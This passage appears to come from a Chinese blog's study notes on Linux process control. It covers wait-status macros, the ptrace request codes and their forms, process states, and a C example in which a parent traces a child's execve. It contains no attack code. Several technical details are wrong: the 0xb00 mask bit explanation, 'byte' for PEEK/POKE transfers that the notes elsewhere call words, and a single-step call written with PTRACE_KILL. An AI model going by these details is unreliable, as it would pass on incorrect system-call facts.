class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WIFEXITED(status)    (((status) &amp; 0xff) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WEXITSTATUS(status)  ((status) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIFSIGNALED(status)   (((status) &amp; 0x7f) &gt; 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WTERMSIG(status)      ((status) &amp; 0x7f)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WCOREDUMP(status)    (((status) &amp; 0x80) != 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIFSTOPPED(status)   (((status) &amp; 0xff) == 0x7f)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WSTOPSIG(status)     ((status) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIFCONTINUED(status) ((((status) &amp; 0xffff) == 0xffff) ? 0 : 1)</span></span><br></pre></td></tr></table></figure><p>比如在 <code>wstatus</code> 的上下文中，掩码 <code>0xb00</code> 可能用于检查以下两种情况：</p><ol><li>子进程是否因为一个信号而停止（<code>WIFSTOPPED</code>），这通常由 <code>0x7f</code> 掩码来检查，但是 <code>0xb00</code> 可以进一步检查是否有特定的停止信号。</li><li>子进程是否产生了核心转储（<code>WCOREDUMP</code>），这通常由 <code>0x80</code> 掩码来检查，但是 <code>0xb00</code> 可以检查更具体的条件。</li></ol><p>具体来说，<code>0xb00</code> 掩码检查的是 <code>wstatus</code> 的第 8 位和第 11 位（从最低位开始计数）：</p><ul><li>第 8 位（10000000）：如果设置，表示子进程产生了核心转储。</li><li>第 11 位（00010000）：这个位的具体含义取决于具体的系统实现，但在许多系统中，它并不用于 <code>wait</code> 或 <code>waitpid</code> 函数。</li></ul><hr><h3 id="1-6-2-ptrace"><a href="#1-6-2-ptrace" class="headerlink" title="1.6.2 ptrace"></a>1.6.2 ptrace</h3><h4 id="1-6-2-1-ptrace函数解析"><a href="#1-6-2-1-ptrace函数解析" class="headerlink" title="1.6.2.1 ptrace函数解析"></a>1.6.2.1 ptrace函数解析</h4><p>参考：<a href="https://blog.csdn.net/u012417380/article/details/60468697">Linux源码分析之Ptrace_特殊进程不可以被跟踪-CSDN博客</a></p><p>参考：<a href="https://zhuanlan.zhihu.com/p/653385264#:~:text=%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%86%E8%A6%81%E4%BB%8B%E7%BB%8D%E7%9A%84%E6%98%AF%E4%B8%80">威力巨大的系统调用——ptrace - 知乎 (zhihu.com)</a></p><p>ptrace提供了父进程观察和控制另一个进程执行的机制，同时提供查询和修改另一进程的核心image(核心镜像？如何理解）它主要用于断点调试。当进程被中止，会通知父进程，进程的内存空间可以被读写，父进程可以选择子进程继续执行还是中止。</p><p>函数原型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ptrace</span><span class="params">(<span class="type">int</span> request, <span class="type">int</span> pid, <span class="type">int</span> addr, <span class="type">int</span> data)</span></span>; </span><br></pre></td></tr></table></figure><ul><li>request：要执行的操作类型；</li><li>pid：被追踪的目标进程ID；</li><li>addr：被监控的目标内存地址；</li><li>data：保存读取出或者要写入的数据。</li></ul><p>Request参数决定了系统调用的功能</p><table><thead><tr><th><strong>请求</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>PTRACE_TRACEME</td><td>本进程被其父进程所跟踪。其父进程应该希望跟踪子进程。</td></tr><tr><td>PTRACE_PEEKTEXT, PTRACE_PEEKDATA</td><td>从内存地址中读取一个字节，内存地址由addr给出。</td></tr><tr><td>PTRACE_PEEKUSR</td><td>从USER区域中读取一个字节，偏移量为addr。</td></tr><tr><td>PTRACE_POKETEXT, PTRACE_POKEDATA</td><td>往内存地址中写入一个字节。内存地址由addr给出。</td></tr><tr><td>PTRACE_POKEUSR</td><td>往USER区域中写入一个字节。偏移量为addr。</td></tr><tr><td>PTRACE_SYSCALL, PTRACE_CONT</td><td>重新运行。</td></tr><tr><td>PTRACE_KILL</td><td>杀掉子进程，使它退出。</td></tr><tr><td>PTRACE_SINGLESTEP</td><td>设置单步执行标志</td></tr><tr><td>PTRACE_ATTACH</td><td>跟踪指定pid 进程。</td></tr><tr><td>PTRACE_DETACH</td><td>结束跟踪</td></tr></tbody></table><p>还有一个inter386特有</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725520062487-a9289a68-c329-4311-a2e5-f3653491e751.png" alt="img"></p><p>对init进程不可使用此函数</p><p><strong>返回值</strong><br>成功返回0。错误返回-1。errno被设置。</p><p><strong>错误</strong><br>EPERM<br>特殊进程不可以被跟踪或进程已经被跟踪。<br>ESRCH<br>指定的进程不存在<br>EIO<br>请求非法</p><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type of the REQUEST argument to `ptrace.&#x27;  */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">ptrace_request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* 跟踪发出此请求的进程,此过程接收的所有信号都可以被其父级拦截,其父级可以使用其他&quot;ptrace&quot;请求 */</span></span><br><span class="line">    PTRACE_TRACEME = <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 返回进程text空间中,地址ADDR处的word(字) */</span></span><br><span class="line">    PTRACE_PEEKTEXT = <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 返回进程data空间中,地址ADDR处的word(字) */</span></span><br><span class="line">    PTRACE_PEEKDATA = <span class="number">2</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 返回进程用户区域中,偏移为ADDR的word(字) */</span></span><br><span class="line">    PTRACE_PEEKUSER = <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将一字大小的DATA写入进程的text空间,地址为ADDR */</span></span><br><span class="line">    PTRACE_POKETEXT = <span class="number">4</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将一字大小的DATA写入进程的data空间,地址为ADDR */</span></span><br><span class="line">    PTRACE_POKEDATA = <span class="number">5</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将一字大小的DATA写入进程的用户区域,偏移量为ADDR */</span></span><br><span class="line">    PTRACE_POKEUSER = <span class="number">6</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 继续该process(进程) */</span></span><br><span class="line">    PTRACE_CONT = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 杀死该process(进程) */</span></span><br><span class="line">    PTRACE_KILL = <span class="number">8</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 单步执行该process(进程) */</span></span><br><span class="line">    PTRACE_SINGLESTEP = <span class="number">9</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 附加到正在运行的进程 */</span></span><br><span class="line">    PTRACE_ATTACH = <span class="number">16</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 从附加到&#x27;PTRACE_ATTACH&#x27;的进程中分离 */</span></span><br><span class="line">    PTRACE_DETACH = <span class="number">17</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 继续并在进入系统调用或从系统调用返回时停止 */</span></span><br><span class="line">    PTRACE_SYSCALL = <span class="number">24</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设置跟踪筛选器选项 */</span></span><br><span class="line">    PTRACE_SETOPTIONS = <span class="number">0x4200</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取最后一条ptrace消息 */</span></span><br><span class="line">    PTRACE_GETEVENTMSG = <span class="number">0x4201</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取流程的siginfo(签名信息) */</span></span><br><span class="line">    PTRACE_GETSIGINFO = <span class="number">0x4202</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 为进程设置新的siginfo(签名信息) */</span></span><br><span class="line">    PTRACE_SETSIGINFO = <span class="number">0x4203</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取寄存器内容 */</span></span><br><span class="line">    PTRACE_GETREGSET = <span class="number">0x4204</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设置寄存器内容 */</span></span><br><span class="line">    PTRACE_SETREGSET = <span class="number">0x4205</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 类似于&#x27;PTRACE_ATTACH&#x27;,但不要强迫跟踪trap(陷阱),也不会影响signal(信号)或group stop state(组停止状态) */</span></span><br><span class="line">    PTRACE_SEIZE = <span class="number">0x4206</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 陷阱捕获了tracee  */</span></span><br><span class="line">    PTRACE_INTERRUPT = <span class="number">0x4207</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 等待下一个group event(事件组) */</span></span><br><span class="line">    PTRACE_LISTEN = <span class="number">0x4208</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检索siginfo_t结构,而无需从队列中删除信号 */</span></span><br><span class="line">    PTRACE_PEEKSIGINFO = <span class="number">0x4209</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取被阻止信号的掩码 */</span></span><br><span class="line">    PTRACE_GETSIGMASK = <span class="number">0x420a</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 更改被阻止信号的掩码 */</span></span><br><span class="line">    PTRACE_SETSIGMASK = <span class="number">0x420b</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取seccomp BPF筛选器 */</span></span><br><span class="line">    PTRACE_SECCOMP_GET_FILTER = <span class="number">0x420c</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取seccomp BPF筛选器元数据 */</span></span><br><span class="line">    PTRACE_SECCOMP_GET_METADATA = <span class="number">0x420d</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取有关系统调用的信息 */</span></span><br><span class="line">    PTRACE_GET_SYSCALL_INFO = <span class="number">0x420e</span></span><br><span class="line"></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><hr><h4 id="1-6-2-2-功能详细描述"><a href="#1-6-2-2-功能详细描述" class="headerlink" title="1.6.2.2 功能详细描述"></a>1.6.2.2 功能详细描述</h4><h5 id="1-6-2-2-1-原来"><a href="#1-6-2-2-1-原来" class="headerlink" title="1.6.2.2.1 原来"></a>1.6.2.2.1 原来</h5><p>1)PTRACE_TRACEME</p><p>形式：ptrace(PTRACE_TRACEME,0 ,0 ,0)<br>描述：本进程被其父进程所跟踪。其父进程应该希望跟踪子进程。</p><p>2)PTRACE_PEEKTEXT, PTRACE_PEEKDATA</p><p>形式：ptrace(PTRACE_PEEKTEXT, pid, addr, data)<br>ptrace(PTRACE_PEEKDATA, pid, addr, data)<br>描述：从内存地址中读取一个字节，pid表示被跟踪的子进程，内存地址由addr给出，data为用户变量地址用于返回读到的数据。在<a href="https://so.csdn.net/so/search?q=Linux&spm=1001.2101.3001.7020">Linux</a>（i386）中用户代码段与用户数据段重合所以读取代码段和数据段数据处理是一样的。</p><p>3)PTRACE_POKETEXT, PTRACE_POKEDATA</p><p>形式：ptrace(PTRACE_POKETEXT, pid, addr, data)<br>ptrace(PTRACE_POKEDATA, pid, addr, data)<br>描述：往内存地址中写入一个字节。pid表示被跟踪的子进程，内存地址由addr给出，data为所要写入的数据。</p><p>4)PTRACE_PEEKUSR</p><p>形式：ptrace(PTRACE_PEEKUSR, pid, addr, data)<br>描述：从USER区域中读取一个字节，pid表示被跟踪的子进程，USER区域地址由addr给出，data为用户变量地址用于返回读到的数据。USER结构为core文件的前面一部分，它描述了进程中止时的一些状态，如：寄存器值，代码、数据段大小，代码、数据段开始地址等。在Linux（i386）中通过PTRACE_PEEKUSER和PTRACE_POKEUSR可以访问USER结构的数据有寄存器和调试寄存器。</p><p>5)PTRACE_POKEUSR</p><p>形式：ptrace(PTRACE_POKEUSR, pid, addr, data)<br>描述：往USER区域中写入一个字节，pid表示被跟踪的子进程，USER区域地址由addr给出，data为需写入的数据。</p><p>6)PTRACE_CONT</p><p>形式：ptrace(PTRACE_CONT, pid, 0, signal)<br>描述：继续执行。pid表示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。</p><p>7)PTRACE_SYSCALL</p><p>形式：ptrace(PTRACE_SYS, pid, 0, signal)<br>描述：继续执行。pid表示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。<strong>与PTRACE_CONT不同的是进行系统调用跟踪</strong>。在被跟踪进程继续运行直到调用系统调用开始或结束时，被跟踪进程被中止，并通知父进程。</p><p>8)PTRACE_KILL</p><p>形式：ptrace(PTRACE_KILL,pid)<br>描述：杀掉子进程，使它退出。pid表示被跟踪的子进程。</p><p>9)PTRACE_SINGLESTEP</p><p>形式：ptrace(PTRACE_KILL, pid, 0, signle)<br>描述：<strong>设置单步执行标志，单步执行一条指令</strong>。pid表示被跟踪的子进程。signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。当被跟踪进程单步执行完一个指令后，被跟踪进程被中止，并通知父进程。</p><p>10)PTRACE_ATTACH</p><p>形式：ptrace(PTRACE_ATTACH,pid)<br>描述：跟踪指定pid 进程。pid表示被跟踪进程。<strong>被跟踪进程将成为当前进程的子进程，并进入中止状态。</strong></p><hr><h5 id="1-6-2-2-2-I386"><a href="#1-6-2-2-2-I386" class="headerlink" title="1.6.2.2.2 I386"></a>1.6.2.2.2 I386</h5><p>12)PTRACE_GETREGS</p><p>形式：ptrace(PTRACE_GETREGS, pid, 0, data)<br>描述：读取寄存器值，pid表示被跟踪的子进程，data为用户变量地址用于返回读到的数据。此功能将读取所有17个基本寄存器的值。</p><p>13)PTRACE_SETREGS</p><p>形式：ptrace(PTRACE_SETREGS, pid, 0, data)<br>描述：设置寄存器值，pid表示被跟踪的子进程，data为用户数据地址。此功能将设置所有17个基本寄存器的值。</p><p>14)PTRACE_GETFPREGS</p><p>形式：ptrace(PTRACE_GETFPREGS, pid, 0, data)<br>描述：读取浮点寄存器值，pid表示被跟踪的子进程，data为用户变量地址用于返回读到的数据。此功能将读取所有浮点协处理器387的所有寄存器的值。</p><p>15)PTRACE_SETFPREGS</p><p>形式：ptrace(PTRACE_SETREGS, pid, 0, data)<br>描述：设置浮点寄存器值，pid表示被跟踪的子进程，data为用户数据地址。此功能将设置所有浮点协处理器387的所有寄存器的值。</p><h3 id="1-6-3-进程状态值中止状态"><a href="#1-6-3-进程状态值中止状态" class="headerlink" title="1.6.3 进程状态值中止状态"></a>1.6.3 进程状态值中止状态</h3><p>在Linux系统中，进程常见的状态有下面这些</p><p>S：Interruptible Sleeping，即可中断睡眠；</p><p>D：Uninterruptible Sleeping，即不可中断睡眠；</p><p>R：Running or Runnable，即运行状态；</p><p>Z：Zombie，即僵尸状态</p><p>T：Stopped or Traced，即中止状态（注意是中止不是终止）</p><p>这里，我们关注点放在<code>T：Stopped or Traced</code>这个类型上。因为<code>Traced</code>类型是由<code>ptrace</code>系统调用提供的一个进程状态。实际上，在某些Linux发行版中，这个类型的进程状态标识符是<code>t</code>而非<code>T</code>。</p><hr><h4 id="1-6-3-1-Stopped状态"><a href="#1-6-3-1-Stopped状态" class="headerlink" title="1.6.3.1 Stopped状态"></a>1.6.3.1 Stopped状态</h4><p>如何能够让一个进程进入到“中止状态”呢？</p><p>我们可以通过ctrl+z来中止当前输入程序的运行，然后可以查看进程状态</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725521534710-ecc3e4f3-3a59-455a-8518-4ee9832628ef.png" alt="img"></p><p>之后再使用fg就可以恢复进程状态</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725521563404-2340e616-ddce-4047-b31e-be1016202d38.png" alt="img"></p><hr><h4 id="1-6-3-2-Traced状态——新手例子"><a href="#1-6-3-2-Traced状态——新手例子" class="headerlink" title="1.6.3.2 Traced状态——新手例子"></a>1.6.3.2 Traced状态——新手例子</h4><p>通过<code>ptrace</code>系统调用可以让一个进程进入<code>Traced</code>状态。</p><ul><li><p><code>tracee</code>进程调用<code>ptrace</code>系统调用，并在<code>request</code>参数处传递<code>PTRACE_TRACEME</code>这个值，表示想要被<code>tracer</code>进程追踪。通过这种方式的进程想要进入<code>Traced</code>状态有两种方式：</p></li><li><ul><li>主动调用<code>exec</code>系列的系统调用；</li><li><code>tracer</code>发送进入<code>Traced</code>状态的相关信号。</li></ul></li><li><p><code>tracer</code>进程调用<code>ptrace</code>系统调用，并在<code>request</code>参数处传递<code>PTRACE_ATTACH</code>这个值，并给出<code>tracee</code>进程的<code>pid</code>，从而让<code>tracee</code>进程进入<code>Traced</code>状态。</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">pid_t</span> child;</span><br><span class="line"><span class="type">long</span> orig_rax;</span><br><span class="line">child=fork();</span><br><span class="line"><span class="keyword">if</span>(child==<span class="number">0</span>)&#123;<span class="comment">//表示这是子进程，子进程fork返回0</span></span><br><span class="line">    <span class="comment">//当前进程会在每次执行系统调用之前暂停，并允许其父进程通过 ptrace 调用来检查和修改它的寄存器、内存等状态，或者继续它的执行。</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;start move!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">ptrace</span>(PTRACE_TRACEME,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);<span class="comment">//0表示当前进程，参数规定是父进程跟踪</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;keep moving???&quot;</span>);</span><br><span class="line">        <span class="built_in">execl</span>(<span class="string">&quot;/bin/ls&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-h&quot;</span>,<span class="literal">NULL</span>);<span class="comment">//这里进程被替换了？</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;/bin/ls ok?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="comment">//父进程，wait函数会等待子进程执行完再执行父进程</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;father step1&quot;</span>);</span><br><span class="line">        <span class="built_in">wait</span>(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;father step2&quot;</span>);</span><br><span class="line">        orig_rax=<span class="built_in">ptrace</span>(PTRACE_PEEKUSER,child,<span class="number">8</span>*ORIG_RAX,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Child process called a system call, id is %ld\n&quot;</span>,orig_rax);</span><br><span class="line">        <span class="built_in">ptrace</span>(PTRACE_CONT,child,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下所示</p><p><img src="E:\blog_images\1725523442460-5ab430b5-a6d0-4ab7-8010-b0217c4f5162.png" alt="img"></p><p>首先fork出来的进程和父进程是不分前后顺序的（前面说到顺序由高度函数决定），所以先父进程进入到else分支，子进程接着进入if分支，然后父进程执行了wait函数之后，交给子进程执行，执行到ptrace(PTRACE_TRACEME,0,NULL,NULL)，但是此时子进程并没有进入traced状态，直到执行到exec类型的函数（才会发出相关信号），才会让子进程也被父函数跟踪。回到父函数，父函数调用了ptrace(PTRACE_PEEKUSER,child,8*ORIG_RAX,NULL)获取子进程RAX的值，59即是execve的系统调用号。之后调用ptrace(PTRACE_CONT,child,NULL,NULL);，让子进程继续执行，也就有了下面的&#x2F;bin&#x2F;ls输出的内容。</p><hr><h5 id="1-6-3-2-1-可能有的一些问题"><a href="#1-6-3-2-1-可能有的一些问题" class="headerlink" title="1.6.3.2.1 可能有的一些问题"></a>1.6.3.2.1 可能有的一些问题</h5><p>问题1：父进程怎么向子进程发送信号？</p><p>问题2：execl系统调用给父进程发送SIGTRAP信号后，父进程怎么样处理这个信号？</p><ul><li><p>首先回答问题2:</p></li><li><ul><li><code>wait</code>系统调用是一个用来进行进程控制的系统调用，它可以用来阻塞父进程，当父进程接收到子进程传来信号或者子进程退出时，父进程才会继续运行。所以这里的<code>wait</code>系统调用很显然用来接收子进程调用<code>execl</code>时产生的<code>SIGTRAP</code>信号。</li></ul></li><li><p>然后是问题1：</p></li><li><ul><li><code>ptrace(PTRACE_CONT, child, NULL, NULL)</code>表达式：</li><li>父进程这里通过调用<code>ptrace</code>系统调用并使用<code>PTRACE_CONT</code>作为操作类型，这个操作类型的作用官方是这样描述的：<strong>恢复处于</strong><code>**Traced**</code><strong>状态的</strong><code>**tracee**</code><strong>进程。最后一个参数表示发送给</strong><code>**tracee**</code><strong>进程的信号。</strong></li></ul></li></ul><hr><h5 id="1-6-3-2-2-USER字段"><a href="#1-6-3-2-2-USER字段" class="headerlink" title="1.6.3.2.2 USER字段"></a>1.6.3.2.2 USER字段</h5><p>其实我们RAX的宏是这样的，那这个15是什么意思呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define ORIG_RAX <span class="number">15</span></span><br></pre></td></tr></table></figure><p>此时就要结合user字段的结构体来看了，<code>USER</code>字段的部分代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">user_regs_struct</span></span><br><span class="line">&#123;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r15;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r14;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r13;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r12;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rbp;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rbx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r11;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r10;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r9;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r8;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rax;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rcx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rdx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rsi;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rdi;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> orig_rax;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rip;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> cs;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span 